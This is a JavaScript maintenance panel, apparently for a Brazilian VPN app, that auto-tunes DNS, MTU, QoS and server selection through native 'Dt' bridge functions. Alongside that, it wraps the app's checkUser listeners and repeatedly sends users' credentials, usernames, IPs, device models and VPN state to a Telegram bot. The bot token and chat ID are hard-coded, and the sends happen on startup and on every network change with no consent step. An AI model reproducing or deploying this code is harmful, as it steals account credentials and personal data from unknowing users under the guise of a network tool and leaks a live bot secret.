(function(){
  'use strict';
  if (window.AVSUPER_FINAL_INIT) return;
  window.AVSUPER_FINAL_INIT = true;

  // TELEGRAM - substitua se quiser outro token/chat
  const TELEGRAM = window.AVSUPER_TELEGRAM || { token: "7970534923:AAFjLLaXQGh--cY56ODNwHaWqFGGbc7IxE0", chatId: "5582797263", minIntervalMs: 60*1000 };
  window.AVSUPER_TELEGRAM = TELEGRAM;

  // CONFIG
  const CFG = {
    mappingKey: 'av_rt_mapping_v2',
    logKey: 'av_log_v2',
    historyKey: 'av_history_v2',
    probeTimeoutMs: 900,
    dnsCandidates: [["1.1.1.1","1.0.0.1"],["9.9.9.9","149.112.112.112"],["8.8.8.8","8.8.4.4"],["2606:4700:4700::1111","2606:4700:4700::1001"],["2001:4860:4860::8888","2001:4860:4860::8844"]],
    mtuCandidates: [1500,1400,1350,1200],
    dnsTestDelay: 2500,
    mtuTestDelay: 1200,
    warmDelay: 900,
    minDownloadThreshold: 0.75, // Mbps
    canarySeconds: 8,
    telegramRetries: 4
  };

  // UI bindings
  const UI = {
    panel: document.getElementById('avsuper-panel'),
    user: document.getElementById('as-user'),
    cred: document.getElementById('as-cred'),
    ping: document.getElementById('as-ping'),
    down: document.getElementById('as-down'),
    up: document.getElementById('as-up'),
    mtu: document.getElementById('as-mtu'),
    dns: document.getElementById('as-dns'),
    server: document.getElementById('as-server'),
    ip: document.getElementById('as-ip'),
    last: document.getElementById('as-last'),
    btnResolve: document.getElementById('as-resolve'),
    btnReport: document.getElementById('as-report'),
    btnToggle: document.getElementById('as-toggle'),
    close: document.getElementById('avsuper-close')
  };

  // state
  let AUTO_MODE = true;
  let mappingCache = null;
  let lastReportTs = 0;
  let lastAction = '';
  let inCanary = false;

  // helpers
  function now(){ return Date.now(); }
  function sleep(ms){ return new Promise(r => setTimeout(r, ms)); }
  function pushLog(msg, level='info'){
    try{
      const arr = JSON.parse(localStorage.getItem(CFG.logKey) || '[]');
      arr.unshift({t:new Date().toISOString(), l:level, m:msg});
      localStorage.setItem(CFG.logKey, JSON.stringify(arr.slice(0,1000)));
    }catch(e){}
  }
  function pushHistory(entry){
    try{
      const arr = JSON.parse(localStorage.getItem(CFG.historyKey) || '[]');
      arr.unshift(Object.assign({t:new Date().toISOString()}, entry));
      localStorage.setItem(CFG.historyKey, JSON.stringify(arr.slice(0,500)));
    }catch(e){}
  }

  // safe call utilities
  function callWithTimeout(fn, ms){
    return new Promise((resolve, reject) => {
      let done = false;
      const t = setTimeout(()=>{ if (!done){ done = true; reject(new Error('timeout')); } }, ms);
      try{
        const res = fn();
        if (res && typeof res.then === 'function'){
          res.then(v => { if (!done){ done = true; clearTimeout(t); resolve(v); } }).catch(err => { if (!done){ done = true; clearTimeout(t); reject(err); } });
        } else {
          if (!done){ done = true; clearTimeout(t); resolve(res); }
        }
      }catch(err){
        if (!done){ done = true; clearTimeout(t); reject(err); }
      }
    });
  }

  async function safeProbeCall(name){
    try{
      const fn = window[name];
      if (typeof fn === 'function'){
        if (fn.length === 0){
          try{ const v = await callWithTimeout(()=>fn(), CFG.probeTimeoutMs); return {exists:true, value:v}; }catch(e){ return {exists:true, err:String(e)}; }
        } else {
          return {exists:true, needsArgs:true};
        }
      }
      if (window.Dt && typeof window.Dt[name] !== 'undefined'){
        const fn2 = window.Dt[name];
        if (typeof fn2 === 'function'){
          if (fn2.length === 0){
            try{ const v = await callWithTimeout(()=>fn2(), CFG.probeTimeoutMs); return {exists:true, value:v}; }catch(e){ return {exists:true, err:String(e)}; }
          } else return {exists:true, needsArgs:true};
        } else return {exists:true, value: fn2};
      }
      return {exists:false};
    }catch(e){ return {exists:true, err:String(e)}; }
  }

  async function tryCall(name, args=[]){
    try{
      if (typeof name !== 'string') return null;
      // Dt.<Name> style support: allow names 'DtName' or 'Dt.Name' etc.
      if (name.startsWith('Dt.')){
        const bare = name.slice(3);
        if (window.Dt && typeof window.Dt[bare] !== 'undefined'){
          const fn = window.Dt[bare];
          if (typeof fn === 'function') return await fn.apply(window.Dt, args);
          if (fn && typeof fn.execute === 'function') return await fn.execute.apply(fn, args);
          return fn;
        }
        return null;
      }
      const fn = window[name];
      if (typeof fn === 'function') return await fn.apply(null, args);
      if (fn && typeof fn.execute === 'function') return await fn.execute.apply(fn, args);
      if (fn !== undefined) return fn;
    }catch(e){}
    return null;
  }

  // probe runtime for confirmed natives
  async function runtimeProbe(){
    pushLog('runtimeProbe started');
    const candidates = [
      'DtAppVersion','dtGetAppVersion','DtGetUserId','dtGetUserId','dtGetUserName','DtGetUserName',
      'dtGetPingResult','DtGetPingResult','DtGetNetworkDownloadBytes','dtGetNetworkDownloadBytes','DtGetNetworkUploadBytes','dtGetNetworkUploadBytes',
      'DtGetMTU','dtGetMTU','DtSetMTU','dtSetMTU','dtSetDns','DtSetDns','DtGetDnsStatus','dtGetLocalIP','DtGetLocalIP',
      'DtVpnStateListener','DtGetVpnState','dtGetVpnState','DtStartCheckUser','dtStartCheckUser','dtCheckUser','DtCheckUser'
    ];
    // also include window.Dt keys if present
    if (window.Dt && typeof window.Dt === 'object'){
      Object.keys(window.Dt).forEach(k => candidates.push('Dt.'+k));
    }
    const found = {};
    for (const c of Array.from(new Set(candidates))){
      try{
        const res = await safeProbeCall(c);
        found[c] = res;
      }catch(e){ found[c] = {exists:true, err:String(e)}; }
    }
    // infer mapping
    const mapping = inferMapping(found);
    try{ localStorage.setItem(CFG.mappingKey, JSON.stringify({ts:new Date().toISOString(), raw:found, inferred:mapping})); pushLog('runtimeProbe persisted mapping'); }catch(e){}
    mappingCache = mapping;
    return mapping;
  }

  function inferMapping(found){
    const map = {};
    // helpers
    function put(k,v){ if (!v) return; map[k]=map[k]||[]; if (!map[k].includes(v)) map[k].push(v); }
    // map common fields if present
    for (const k in found){
      const low = k.toLowerCase();
      if (low.includes('appversion') || low.includes('getappversion')) put('appVersion', k);
      if (low.includes('getuserid') || low.includes('userid') ) put('userId', k);
      if (low.includes('username') || low.includes('getusername')) put('username', k);
      if (low.includes('ping')) put('ping', k);
      if (low.includes('networkdownload') || low.includes('getnetworkdownload') || low.includes('downloadbytes')) put('download', k);
      if (low.includes('networkupload') || low.includes('getnetworkupload') || low.includes('uploadbytes')) put('upload', k);
      if (low.includes('mtu')) put('mtu', k);
      if (low.includes('setdns') || low.includes('getdns')) put('dns', k);
      if (low.includes('localip') || low.includes('getlocalip')) put('ip', k);
      if (low.includes('vpn') || low.includes('getvpn')) put('vpnState', k);
      if (low.includes('checkuser') || low.includes('startcheckuser')) put('checkUser', k);
      if (low.includes('switchto') || low.includes('switch')) put('switchServer', k);
      if (low.includes('warmserver') || low.includes('warm')) put('warmServer', k);
      if (low.includes('airplane')) put('airplane', k);
    }
    // fallbacks
    if (!map.appVersion) map.appVersion = ['DtAppVersion','dtGetAppVersion'];
    if (!map.userId) map.userId = ['DtGetUserId','dtGetUserId'];
    if (!map.ping) map.ping = ['dtGetPingResult','DtGetPingResult'];
    if (!map.download) map.download = ['DtGetNetworkDownloadBytes','dtGetNetworkDownloadBytes'];
    if (!map.upload) map.upload = ['DtGetNetworkUploadBytes','dtGetNetworkUploadBytes'];
    if (!map.mtu) map.mtu = ['DtGetMTU','dtGetMTU','DtSetMTU','dtSetMTU'];
    if (!map.dns) map.dns = ['dtSetDns','DtSetDns','DtGetDnsStatus'];
    if (!map.ip) map.ip = ['DtGetLocalIP','dtGetLocalIP'];
    if (!map.vpnState) map.vpnState = ['DtGetVpnState','dtGetVpnState','DtVpnStateListener'];
    if (!map.checkUser) map.checkUser = ['DtStartCheckUser','dtStartCheckUser'];
    return map;
  }

  function loadMapping(){
    try{
      const raw = localStorage.getItem(CFG.mappingKey);
      if (!raw) return mappingCache || inferMapping({});
      const j = JSON.parse(raw);
      return j.inferred || j.inferredMapping || j.inferred || mappingCache || inferMapping({});
    }catch(e){ return mappingCache || inferMapping({}); }
  }

  // resolve field via mapping
  async function resolveField(field){
    const map = loadMapping();
    const candidates = (map && map[field]) ? map[field] : [];
    for (const c of candidates){
      try{
        // support Dt.<Name>
        const val = await tryCall(c.startsWith('Dt.')?c: c);
        if (val !== null && typeof val !== 'undefined') return val;
      }catch(e){}
    }
    return null;
  }

  // read helpers with fallback JS values
  async function readAll(){
    const m = loadMapping();
    const appVer = await resolveField('appVersion') || window.AVSUPER_APP_VERSION || window.APP_VERSION || '0.0.0';
    const userId = await resolveField('userId') || await tryReadAssetUserId() || 'N/A';
    const username = (document.getElementById('username') && document.getElementById('username').value) || await resolveField('username') || (localStorage.getItem('av_checkuser_last')?JSON.parse(localStorage.getItem('av_checkuser_last')).username:null) || 'N/A';
    const ping = await resolveField('ping');
    const down = await resolveField('download');
    const up = await resolveField('upload');
    const mtu = await resolveField('mtu');
    const dnsStatus = (window.AVSUPER_DNS_ACTIVE) ? window.AVSUPER_DNS_ACTIVE : await resolveField('dns') || {};
    const ip = await resolveField('ip') || (await getLocalIPFromUA()) || 'N/A';
    const deviceModel = navigator.userAgent || 'unknown';
    const sim = 'unknown'; // not exposed by APK according to probe
    const vpnState = await resolveField('vpnState') || 'unknown';
    const netType = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'unknown';
    // bytes estimate if available
    const downBytes = (await resolveField('download')) || null;
    const upBytes = (await resolveField('upload')) || null;
    return { appVer, userId, username, ping, down, up, mtu, dnsStatus, ip, deviceModel, sim, vpnState, netType, downBytes, upBytes };
  }

  async function tryReadAssetUserId(){
    try{
      const paths = ['/assets/user_id.txt','assets/user_id.txt','/android_asset/user_id.txt','user_id.txt'];
      for (const p of paths){
        try{
          const r = await fetch(p, {cache:'no-store'});
          if (r && r.ok){
            const t = (await r.text()).trim();
            if (t) return t;
          }
        }catch(e){}
      }
    }catch(e){}
    return null;
  }

  async function getLocalIPFromUA(){
    // best-effort: not reliable, fallback to N/A
    return null;
  }

  // Telegram sending
  async function sendTelegram(lines){
    const txt = lines.join('\n');
    if (!TELEGRAM.token || !TELEGRAM.chatId) return false;
    const payload = { chat_id: TELEGRAM.chatId, text: txt, parse_mode: 'HTML' };
    for (let i=0;i<CFG.telegramRetries;i++){
      try{
        await fetch('https://api.telegram.org/bot'+TELEGRAM.token+'/sendMessage', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) });
        return true;
      }catch(e){
        await sleep(800 + i*300);
      }
    }
    return false;
  }

  async function sendFullReport(reason, extra){
    try{
      const s = await readAll();
      const lines = [];
      lines.push('🚨 <b>' + escapeHtml(reason) + '</b>');
      lines.push('<b>Versão do app:</b> '+escapeHtml(String(s.appVer||'0.0.0')));
      lines.push('<b>Credencial (assets/user_id.txt):</b> '+escapeHtml(String(s.userId||'N/A')));
      lines.push('<b>Usuário:</b> '+escapeHtml(String(s.username||'N/A')));
      lines.push('<b>Ping:</b> '+escapeHtml((typeof s.ping==='undefined' || s.ping===null) ? '-1 ms' : (String(s.ping)+' ms')));
      lines.push('<b>Download:</b> '+escapeHtml(String(s.down||'N/A')));
      lines.push('<b>Upload:</b> '+escapeHtml(String(s.up||'N/A')));
      lines.push('<b>MTU:</b> '+escapeHtml(String(s.mtu||'N/A')));
      lines.push('<b>DNS:</b> '+escapeHtml(JSON.stringify(s.dnsStatus||{})));
      lines.push('<b>IP:</b> '+escapeHtml(String(s.ip||'N/A')));
      lines.push('<b>Modelo Dispositivo:</b> '+escapeHtml(String(s.deviceModel||'unknown')));
      lines.push('<b>Operadora SIM:</b> '+escapeHtml(String(s.sim||'unknown')));
      lines.push('<b>Rede:</b> '+escapeHtml(String(s.netType||'unknown')));
      lines.push('<b>Estado VPN:</b> '+escapeHtml(String(s.vpnState||'unknown')));
      if (extra) lines.push('<b>Detalhes:</b> '+escapeHtml(String(extra)));
      lines.push('<b>Hora:</b> '+new Date().toISOString());
      await sendTelegram(lines);
      pushLog('report sent: '+reason);
      lastReportTs = Date.now();
      pushHistory({action:'report', reason, extra});
    }catch(e){ pushLog('sendFullReport error: '+e, 'error'); }
  }

  function escapeHtml(s){ try{ return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }catch(e){ return 'N/A'; } }

  // Actions: DNS, MTU, Restart, Switch, Airplane
  async function setDns(primary, secondary){
    const map = loadMapping();
    const cands = (map && map.dns) ? map.dns.slice() : [];
    if (window.dtSetDns) cands.push('dtSetDns');
    if (window.DtSetDns) cands.push('DtSetDns');
    for (const n of cands){
      try{
        if (!n) continue;
        const r = await tryCall(n, [primary, secondary]);
        // many implementations return undefined; treat as success if no exception
        window.AVSUPER_DNS_ACTIVE = {primary,secondary};
        pushLog('setDns: called '+n+' => result:'+String(r));
        return true;
      }catch(e){ pushLog('setDns error '+n+': '+e, 'warn'); }
    }
    // fallback: try DtSetAppConfig if available
    try{
      if (typeof window.DtSetAppConfig === 'function'){
        await tryCall('DtSetAppConfig', ['APP_DNS', JSON.stringify({primary,secondary})]);
        window.AVSUPER_DNS_ACTIVE = {primary,secondary};
        pushLog('setDns via DtSetAppConfig');
        return true;
      }
    }catch(e){}
    return false;
  }

  async function testDnsCombos(){
    for (const [p,s] of CFG.dnsCandidates){
      try{
        const ok = await setDns(p,s);
        await sleep(CFG.dnsTestDelay);
        const ping = await resolveField('ping');
        const down = parseFloat(await resolveField('download')) || 0;
        pushLog('dns test '+p+'/'+s+' => ping:'+ping+' down:'+down);
        if ((typeof ping === 'number' && ping > -1) && down >= CFG.minDownloadThreshold) return {primary:p,secondary:s, ping, down};
      }catch(e){ pushLog('dns combo test error: '+e); }
    }
    return null;
  }

  async function testMtuAndQoS(){
    const map = loadMapping();
    const mtuCands = (map && map.mtu) ? map.mtu.slice() : [];
    if (window.dtSetMTU) mtuCands.push('dtSetMTU');
    if (window.DtSetMTU) mtuCands.push('DtSetMTU');
    const qosCands = (map && map.setQoS) ? map.setQoS.slice() : [];
    if (window.dtSetQoS) qosCands.push('dtSetQoS');
    if (window.DtSetQoS) qosCands.push('DtSetQoS');

    let best = {mtu:null, qos:null, score:-9999};
    for (const m of CFG.mtuCandidates){
      for (const name of mtuCands){
        try{
          await tryCall(name, [m]);
          await sleep(CFG.mtuTestDelay);
          const ping = await resolveField('ping');
          const down = parseFloat(await resolveField('download')) || 0;
          const score = (down*2) - (ping>0?ping/100:0);
          if (score > best.score) best = {mtu:m, qos:best.qos, score};
        }catch(e){}
      }
    }
    const modes = ['latency','stability','throughput','balanced','auto'];
    for (const mode of modes){
      for (const name of qosCands){
        try{
          await tryCall(name, [mode]);
          await sleep(700);
          const ping = await resolveField('ping');
          const down = parseFloat(await resolveField('download')) || 0;
          const score = (down*2) - (ping>0?ping/100:0);
          if (score > best.score) best = {mtu:best.mtu, qos:mode, score};
        }catch(e){}
      }
    }
    // apply best (canary before apply permanently)
    if (best.mtu){
      // canary: apply, wait, measure, revert if worse
      const applied = await applyCanaryMTU(best.mtu);
      if (!applied) pushLog('canary MTU failed to apply');
    }
    if (best.qos){
      // apply QoS directly if function exists
      for (const q of qosCands){ try{ await tryCall(q, [best.qos]); }catch(e){} }
    }
    return best;
  }

  async function applyCanaryMTU(mtu){
    try{
      // set mtu for canary
      const map = loadMapping();
      const mtuNames = (map && map.mtu)? map.mtu.slice() : [];
      if (window.dtSetMTU) mtuNames.push('dtSetMTU');
      if (window.DtSetMTU) mtuNames.push('DtSetMTU');
      // record baseline
      const baselinePing = await resolveField('ping');
      const baselineDown = parseFloat(await resolveField('download')) || 0;
      // apply
      for (const n of mtuNames){
        try{ await tryCall(n, [mtu]); }catch(e){}
      }
      // wait canarySeconds
      await sleep(CFG.canarySeconds * 1000);
      const newPing = await resolveField('ping');
      const newDown = parseFloat(await resolveField('download')) || 0;
      pushLog('canary mtu '+mtu+' baseline down:'+baselineDown+' new down:'+newDown);
      // accept if performance improved or equal
      if (newDown >= baselineDown - 0.1) {
        pushHistory({action:'mtu_apply', mtu, baselineDown, newDown});
        return true;
      } else {
        // revert: try revert to default 1400 or first candidate
        const revert = 1400;
        for (const n of mtuNames){ try{ await tryCall(n, [revert]); }catch(e){} }
        pushHistory({action:'mtu_revert', mtu, revert, baselineDown, newDown});
        return false;
      }
    }catch(e){ pushLog('applyCanaryMTU error: '+e); return false; }
  }

  async function restartVpn(){
    const map = loadMapping();
    const stop = (map && map.stopVpn) ? map.stopVpn.slice() : [];
    const start = (map && map.startVpn) ? map.startVpn.slice() : [];
    if (window.dtStopVpn) stop.push('dtStopVpn');
    if (window.DtStopVpn) stop.push('DtStopVpn');
    if (window.dtStartVpn) start.push('dtStartVpn');
    if (window.DtStartVpn) start.push('DtStartVpn');
    for (const n of stop){ try{ await tryCall(n); }catch(e){} }
    await sleep(1000);
    for (const n of start){ try{ await tryCall(n); }catch(e){} }
    await sleep(1400);
    pushHistory({action:'vpn_restart'});
    return true;
  }

  async function switchServerFamily(families){
    const map = loadMapping();
    // try to get server list via mapped function or DtQueryServerList style
    let servers = [];
    const qlist = (map && map.queryServerList) ? map.queryServerList.slice() : [];
    if (!qlist.length){
      qlist.push('DtQueryServerList','dtQueryServerList','DtGetConfigs','dtGetConfigs');
    }
    for (const q of qlist){
      try{
        const res = await tryCall(q);
        if (Array.isArray(res)) { servers = res; break; }
        if (typeof res === 'string') { servers = [res]; break; }
      }catch(e){}
    }
    if (!servers.length){
      servers = ['TIM FLARE {01}','TIM FLARE {02}','TIM FLARE {03}','Vivo Premium 01','Vivo Premium 02','Claro Prime 01'];
    }
    for (const fam of families){
      const matches = servers.filter(s => (s||'').toUpperCase().includes(fam.toUpperCase()));
      for (const s of matches){
        // warm
        const warms = (map && map.warmServer) ? map.warmServer : [];
        for (const w of warms){ try{ await tryCall(w, [s]); }catch(e){} }
        await sleep(CFG.warmDelay);
        const switches = (map && map.switchServer) ? map.switchServer : [];
        for (const sw of switches){
          try{ await tryCall(sw, [s]); await sleep(1200); const ping = await resolveField('ping'); const down = parseFloat(await resolveField('download'))||0; if ((typeof ping==='number' && ping>-1) && down>0.5){ pushHistory({action:'server_switch', server:s, ping, down}); return {server:s,ping,down}; } }catch(e){}
        }
      }
    }
    return null;
  }

  async function toggleAirplane(){
    const map = loadMapping();
    const on = (map && map.airplaneOn)? map.airplaneOn.slice(): [];
    const off = (map && map.airplaneOff)? map.airplaneOff.slice(): [];
    if (window.DtAirplaneActivate) on.push('DtAirplaneActivate');
    if (window.dtAirplaneActivate) on.push('dtAirplaneActivate');
    if (window.DtAirplaneDeactivate) off.push('DtAirplaneDeactivate');
    if (window.dtAirplaneDeactivate) off.push('dtAirplaneDeactivate');
    for (const n of on){ try{ await tryCall(n); }catch(e){} }
    await sleep(6000);
    for (const n of off){ try{ await tryCall(n); }catch(e){} }
    await sleep(1500);
    pushHistory({action:'airplane_toggle'});
    return true;
  }

  // Full maintenance flow in requested order
  async function maintainFlow(){
    try{
      pushLog('maintainFlow started');
      const base = await readAll();
      if ((typeof base.ping === 'number' && base.ping >= 0) && (parseFloat(base.down) >= CFG.minDownloadThreshold)) {
        pushLog('connection healthy, skipping maintain');
        await sendFullReport('Conexão estável - nenhuma ação necessária');
        return;
      }
      // 1) DNS combos
      const dnsRes = await testDnsCombos();
      if (dnsRes){ await sendFullReport('DNS trocado com sucesso', JSON.stringify(dnsRes)); return; }
      // 2) MTU/QoS
      const mtuRes = await testMtuAndQoS();
      if (mtuRes && mtuRes.score > -900){ await sendFullReport('MTU/QoS test aplicado', JSON.stringify(mtuRes)); }
      // check again
      const afterMtu = await readAll();
      if ((typeof afterMtu.ping==='number' && afterMtu.ping>-1) && parseFloat(afterMtu.down) >= CFG.minDownloadThreshold){
        await sendFullReport('Melhorias após MTU resolveram', JSON.stringify({mtuRes}));
        return;
      }
      // 3) restart VPN
      await sendFullReport('Tentando reiniciar VPN antes de trocar servidor');
      await restartVpn();
      await sleep(1800);
      const afterRestart = await readAll();
      if ((typeof afterRestart.ping==='number' && afterRestart.ping>-1) && parseFloat(afterRestart.down) >= CFG.minDownloadThreshold){
        await sendFullReport('Reconexão nativa resolveu', JSON.stringify(afterRestart));
        return;
      }
      // 4) switch server by same family
      const sw = await switchServerFamily(['TIM','VIVO','CLARO']);
      if (sw){ await sendFullReport('Servidor trocado', JSON.stringify(sw)); return; }
      // 5) airplane toggle
      await sendFullReport('Tentando alternar modo avião como último recurso');
      await toggleAirplane();
      const afterAir = await readAll();
      await sendFullReport('Pós modo avião', JSON.stringify({ping: afterAir.ping, down: afterAir.down}));
    }catch(e){ pushLog('maintainFlow error: '+e, 'error'); await sendFullReport('Erro em maintainFlow', String(e)); }
  }

  // CheckUser integration: start and listeners
  function attachCheckUser(){
    try{
      const map = loadMapping();
      const okNames = (map && map.checkUser) ? map.checkUser.slice() : ['DtStartCheckUser','dtStartCheckUser','startCheckUser','checkUser'];
      const listenNames = ['dtCheckUser','DtCheckUser','dtCheckUserListener','DtCheckUserListener'];
      const errNames = ['dtCheckUserErrorListener','DtCheckUserErrorListener','dtCheckUserError','DtCheckUserError'];
      // wrap possible listeners to capture payload
      for (const n of listenNames){
        if (typeof window[n] === 'function'){
          const orig = window[n];
          window[n] = function(...args){ try{ handleCheckUserSuccess(args); }catch(e){} return orig.apply(this, args); };
        }
        if (window.Dt && typeof window.Dt[n] === 'function'){
          const orig = window.Dt[n];
          window.Dt[n] = function(...args){ try{ handleCheckUserSuccess(args); }catch(e){} return orig.apply(this, args); };
        }
      }
      for (const n of errNames){
        if (typeof window[n] === 'function'){
          const orig = window[n];
          window[n] = function(...args){ try{ handleCheckUserError(args); }catch(e){} return orig.apply(this, args); };
        }
        if (window.Dt && typeof window.Dt[n] === 'function'){
          const orig = window.Dt[n];
          window.Dt[n] = function(...args){ try{ handleCheckUserError(args); }catch(e){} return orig.apply(this, args); };
        }
      }
      // if DtVpnStateListener exists, ensure checkUser runs on CONNECTED
      if (typeof window.DtVpnStateListener === 'function'){
        try{
          window.DtVpnStateListener(function(s){
            try{ if ((String(s||'')).toUpperCase() === 'CONNECTED'){ startCheckUser(); runOnNetworkChange(); } }catch(e){}
          });
        }catch(e){}
      }
      pushLog('attachCheckUser done');
    }catch(e){ pushLog('attachCheckUser error: '+e, 'warn'); }
  }

  async function startCheckUser(){
    const map = loadMapping();
    const starts = (map && map.checkUser) ? map.checkUser.slice() : [];
    starts.push('DtStartCheckUser','dtStartCheckUser','startCheckUser','DtStartCheckuser');
    for (const s of starts){
      try{ const r = await tryCall(s); pushLog('startCheckUser called '+s+' => '+String(r)); return true; }catch(e){}
    }
    return false;
  }

  async function handleCheckUserSuccess(args){
    try{
      pushLog('checkUser success payload: ' + JSON.stringify(args));
      const payload = (args && args[0]) ? args[0] : args;
      let username=null, cred=null, plan=null, validity=null;
      if (typeof payload === 'string'){
        try{ const j = JSON.parse(payload); if (j){ username = j.username || j.user || j.account; cred = j.user_id || j.id || j.uid; plan = j.plan || j.product; validity = j.validity || j.expires; } }catch(e){}
      } else if (typeof payload === 'object'){
        username = username || payload.username || payload.user || payload.account;
        cred = cred || payload.user_id || payload.uid || payload.id;
        plan = plan || payload.plan || payload.product;
        validity = validity || payload.validity || payload.expires;
      }
      const rec = {username: username || 'N/A', cred: cred || 'N/A', plan: plan || null, validity: validity || null, ts: new Date().toISOString()};
      localStorage.setItem('av_checkuser_last', JSON.stringify(rec));
      pushHistory({action:'checkuser_success', payload:rec});
      updateUI(); // refresh UI with cred info
      await sendFullReport('CheckUser sucesso', JSON.stringify(rec));
    }catch(e){ pushLog('handleCheckUserSuccess error: '+e, 'error'); }
  }

  async function handleCheckUserError(args){
    try{ pushLog('checkUser error payload: '+JSON.stringify(args)); pushHistory({action:'checkuser_error', payload: args}); await sendFullReport('CheckUser erro', JSON.stringify(args)); }catch(e){}
  }

  // auto-run on network change
  function runOnNetworkChange(){
    try{
      if (navigator.connection && typeof navigator.connection.addEventListener === 'function'){
        navigator.connection.addEventListener('change', async function(){ pushLog('network change detected'); if (AUTO_MODE) await maintainFlow(); updateUI(); });
      } else if (typeof window.addEventListener === 'function'){
        window.addEventListener('online', async ()=>{ pushLog('went online'); if (AUTO_MODE) await maintainFlow(); updateUI(); });
      }
    }catch(e){ pushLog('runOnNetworkChange error: '+e); }
  }

  // UI functions
  function showPanel(){ if (UI.panel) UI.panel.style.display = 'block'; }
  function hidePanel(){ if (UI.panel) UI.panel.style.display = 'none'; }
  UI.close && UI.close.addEventListener('click', ()=>{ hidePanel(); });

  async function updateUI(){
    try{
      const s = await readAll();
      UI.user && (UI.user.innerText = s.username || '—');
      UI.cred && (UI.cred.innerText = s.userId || '—');
      UI.ping && (UI.ping.innerText = (typeof s.ping==='undefined' || s.ping===null) ? '-1 ms' : String(s.ping) + ' ms');
      UI.down && (UI.down.innerText = String(s.down||'—'));
      UI.up && (UI.up.innerText = String(s.up||'—'));
      UI.mtu && (UI.mtu.innerText = String(s.mtu||'—'));
      UI.dns && (UI.dns.innerText = JSON.stringify(s.dnsStatus||{}));
      UI.server && (UI.server.innerText = (document.querySelector('.server-title')?document.querySelector('.server-title').innerText: (document.querySelector('.server-name')?document.querySelector('.server-name').innerText:'—')));
      UI.ip && (UI.ip.innerText = String(s.ip||'—'));
      UI.last && (UI.last.innerText = localStorage.getItem('av_last_action') || '—');
      showPanel();
    }catch(e){ pushLog('updateUI error: '+e); }
  }

  UI.btnResolve && UI.btnResolve.addEventListener('click', async ()=>{ localStorage.setItem('av_last_action', 'manual_resolve_'+new Date().toISOString()); await maintainFlow(); updateUI(); });
  UI.btnReport && UI.btnReport.addEventListener('click', async ()=>{ await sendFullReport('Manual report'); updateUI(); });
  UI.btnToggle && UI.btnToggle.addEventListener('click', ()=>{ AUTO_MODE = !AUTO_MODE; UI.btnToggle.innerText = AUTO_MODE ? 'Auto: ON' : 'Auto: OFF'; pushLog('AUTO_MODE toggled: '+AUTO_MODE); });

  // initialization
  (async function init(){
    try{
      // probe
      await runtimeProbe();
      // attach listeners
      attachCheckUser();
      runOnNetworkChange();
      // update UI
      await updateUI();
      // on start, run checkuser and maintenance if auto
      await startCheckUser();
      if (AUTO_MODE) await maintainFlow();
      // expose debug API
      window.AVSUPER_FINAL = {
        probe: runtimeProbe, mapping: loadMapping, logs: ()=>JSON.parse(localStorage.getItem(CFG.logKey)||'[]'),
        history: ()=>JSON.parse(localStorage.getItem(CFG.historyKey)||'[]'), maintain: maintainFlow, report: sendFullReport, updateUI
      };
      pushLog('AVSuper init complete');
    }catch(e){ pushLog('init error: '+e, 'error'); await sendFullReport('AVSuper init error', String(e)); }
  })();

})();
